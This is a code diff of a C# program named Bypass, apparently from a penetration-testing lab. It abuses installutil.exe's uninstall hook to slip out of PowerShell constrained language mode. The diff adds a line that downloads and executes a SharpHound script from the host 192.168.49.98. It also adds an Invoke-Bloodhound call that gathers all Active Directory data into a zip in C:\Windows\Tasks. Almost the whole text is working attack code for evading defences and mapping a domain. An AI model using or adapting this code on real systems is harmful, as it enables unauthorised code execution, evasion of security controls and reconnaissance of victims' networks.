@@ -1,5 +1,6 @@
-//This bypasses constrained language mode... I think?
+//This bypasses constrained language mode... 
 //Run with C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /U
+//This code will download sharphound and invoke the bloodhound method
 using System;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
@@ -18,12 +19,12 @@ namespace Bypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            String cmd = "$ExecutionContext.SessionState.LanguageMode |Out-File -FilePath C:\\tools\\mode.txt";
+            String cmd = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.98/sharphound.ps1')";
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
             PowerShell ps = PowerShell.Create();
             ps.Runspace = rs;
-            ps.AddScript(cmd);
+            ps.AddScript(cmd).AddScript("Invoke-Bloodhound -CollectionMethod All -ZipFileName C:\\Windows\\Tasks\\bh.zip");
             ps.Invoke();
             rs.Close();
             
